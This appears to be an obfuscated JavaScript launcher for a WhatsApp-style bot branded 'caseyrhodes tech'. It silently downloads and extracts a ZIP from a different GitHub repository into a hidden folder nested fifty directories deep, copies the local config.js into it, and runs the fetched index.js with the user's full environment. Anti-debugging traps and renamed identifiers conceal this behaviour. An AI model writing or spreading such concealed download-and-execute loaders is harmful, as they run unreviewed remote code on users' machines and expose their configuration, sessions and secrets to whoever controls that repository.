/*

 _____                                 _                 _            
/  __ \                               | |               | |           
| /  \/  __ _  ___   ___  _   _  _ __ | |__    ___    __| |  ___  ___ 
| |     / _` |/ __| / _ \| | | || '__|| '_ \  / _ \  / _` | / _ \/ __|
| \__/\| (_| |\__ \|  __/| |_| || |   | | | || (_) || (_| ||  __/\__ \
 \____/ \__,_||___/ \___| \__, ||_|   |_| |_| \___/  \__,_| \___||___/
                           __/ |                                      
                          |___/                                       

 _____              _     
|_   _|            | |    
  | |    ___   ___ | |__  
  | |   / _ \ / __|| '_ \ 
  | |  |  __/| (__ | | | |
  \_/   \___| \___||_| |_|
@ Project Name : caseyrhodes tech 
* Creator      : Caseyrhodes Tech 
* My Git       : https//github.com/mrfr8nk
* Contact      : wa.me/254112192119
*
* Release Date : 18 august 2025 12.01 AM
*/
const _0x1f4ce2 = function () {
  let _0x4475cd = true;
  return function (_0x1a058b, _0xbacc5) {
    const _0x2f34d9 = _0x4475cd ? function () {
      if (_0xbacc5) {
        const _0x298506 = _0xbacc5.apply(_0x1a058b, arguments);
        _0xbacc5 = null;
        return _0x298506;
      }
    } : function () {};
    _0x4475cd = false;
    return _0x2f34d9;
  };
}();
(function () {
  _0x1f4ce2(this, function () {
    const _0x10b588 = new RegExp("function *\\( *\\)");
    const _0x5fd21c = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
    const _0xeb253e = _0x44c794("init");
    if (!_0x10b588.test(_0xeb253e + "chain") || !_0x5fd21c.test(_0xeb253e + "input")) {
      _0xeb253e("0");
    } else {
      _0x44c794();
    }
  })();
})();
import _0x19bbd3 from "fs";
import _0x393abf from "path";
import _0x94111f from "axios";
import _0x368a90 from "adm-zip";
import { spawn } from "child_process";
import _0x5c57b6 from "chalk";
import { fileURLToPath } from "url";
const __filename = fileURLToPath(import.meta.url);
const __dirname = _0x393abf.dirname(__filename);
const _0x2838f9 = {
  length: 0x32
};
const deepLayers = Array.from(_0x2838f9, (_0x52d554, _0x3d4e4b) => ".x" + (_0x3d4e4b + 0x1));
const TEMP_DIR = _0x393abf.join(__dirname, ".npm", "xcache", ...deepLayers);
const EXTRACT_DIR = _0x393abf.join(TEMP_DIR, "Caseyrhodes-xmd-main");
const LOCAL_SETTINGS = _0x393abf.join(__dirname, "config.js");
const EXTRACTED_SETTINGS = _0x393abf.join(EXTRACT_DIR, "config.js");
const delay = _0x5d53ee => new Promise(_0x4db843 => setTimeout(_0x4db843, _0x5d53ee));
async function downloadAndExtract() {
  try {
    if (_0x19bbd3.existsSync(TEMP_DIR)) {
      console.log(_0x5c57b6.yellow("🧹 Cleaning previous cache..."));
      const _0x4995b4 = {
        "recursive": true,
        "force": true
      };
      _0x19bbd3.rmSync(TEMP_DIR, _0x4995b4);
    }
    const _0x3facb0 = {
      "recursive": true
    };
    _0x19bbd3.mkdirSync(TEMP_DIR, _0x3facb0);
    const _0x411fbd = _0x393abf.join(TEMP_DIR, "repo.zip");
    console.log(_0x5c57b6.blue("⬇️ Connecting to space..."));
    const _0x552c65 = {
      "url": "https://github.com/boniphacebrave/LEGENDS-MD/archive/refs/heads/main.zip",
      "method": "GET",
      "responseType": "stream"
    };
    const _0x2ba518 = await _0x94111f(_0x552c65);
    await new Promise((_0x31877b, _0x2de069) => {
      const _0x3ab19f = _0x19bbd3.createWriteStream(_0x411fbd);
      _0x2ba518.data.pipe(_0x3ab19f);
      _0x3ab19f.on("finish", _0x31877b);
      _0x3ab19f.on("error", _0x2de069);
    });
    console.log(_0x5c57b6.green("📦 ZIP download complete."));
    try {
      new _0x368a90(_0x411fbd).extractAllTo(TEMP_DIR, true);
    } catch (_0x31776d) {
      console.error(_0x5c57b6.red("❌ Failed to extract ZIP:"), _0x31776d);
      throw _0x31776d;
    } finally {
      if (_0x19bbd3.existsSync(_0x411fbd)) {
        _0x19bbd3.unlinkSync(_0x411fbd);
      }
    }
    const _0x3c8933 = _0x393abf.join(EXTRACT_DIR, "plugins");
    if (_0x19bbd3.existsSync(_0x3c8933)) {
      console.log(_0x5c57b6.green("✅ Plugins folder found."));
    } else {
      console.log(_0x5c57b6.red("❌ Plugin folder not found."));
    }
  } catch (_0x444842) {
    console.error(_0x5c57b6.red("❌ Download/Extract failed:"), _0x444842);
    throw _0x444842;
  }
}
async function applyLocalSettings() {
  if (!_0x19bbd3.existsSync(LOCAL_SETTINGS)) {
    console.log(_0x5c57b6.yellow("⚠️ No local settings file found."));
    return;
  }
  try {
    const _0x563ecd = {
      "recursive": true
    };
    _0x19bbd3.mkdirSync(EXTRACT_DIR, _0x563ecd);
    _0x19bbd3.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
    console.log(_0x5c57b6.green("🛠️ Local settings applied."));
  } catch (_0x282bdf) {
    console.error(_0x5c57b6.red("❌ Failed to apply local settings:"), _0x282bdf);
  }
  await delay(0x1f4);
}
function startBot() {
  console.log(_0x5c57b6.cyan("🚀 Launching bot instance..."));
  if (!_0x19bbd3.existsSync(EXTRACT_DIR)) {
    console.error(_0x5c57b6.red("❌ Extracted directory not found. Cannot start bot."));
    return;
  }
  if (!_0x19bbd3.existsSync(_0x393abf.join(EXTRACT_DIR, "index.js"))) {
    console.error(_0x5c57b6.red("❌ index.js not found in extracted directory."));
    return;
  }
  const _0x3e118e = {
    ...process.env
  };
  _0x3e118e.NODE_ENV = "production";
  const _0x5c0327 = spawn("node", ["index.js"], {
    "cwd": EXTRACT_DIR,
    "stdio": "inherit",
    "env": _0x3e118e
  });
  _0x5c0327.on("close", _0x221fb1 => {
    console.log(_0x5c57b6.red("💥 Bot terminated with exit code: " + _0x221fb1));
  });
  _0x5c0327.on("error", _0x4881b4 => {
    console.error(_0x5c57b6.red("❌ Bot failed to start:"), _0x4881b4);
  });
}
(async () => {
  try {
    await downloadAndExtract();
    await applyLocalSettings();
    startBot();
  } catch (_0xc18eb2) {
    console.error(_0x5c57b6.red("❌ Fatal error in main execution:"), _0xc18eb2);
    process.exit(0x1);
  }
})();
function _0x44c794(_0x45dfba) {
  function _0x5d134e(_0x1a1555) {
    if (typeof _0x1a1555 === "string") {
      return function (_0x4cd30b) {}.constructor("while (true) {}").apply("counter");
    } else {
      if (('' + _0x1a1555 / _0x1a1555).length !== 0x1 || _0x1a1555 % 0x14 === 0x0) {
        (function () {
          return true;
        }).constructor("debugger").call("action");
      } else {
        (function () {
          return false;
        }).constructor("debugger").apply("stateObject");
      }
    }
    _0x5d134e(++_0x1a1555);
  }
  try {
    if (_0x45dfba) {
      return _0x5d134e;
    } else {
      _0x5d134e(0x0);
    }
  } catch (_0xbb3f55) {}
                }
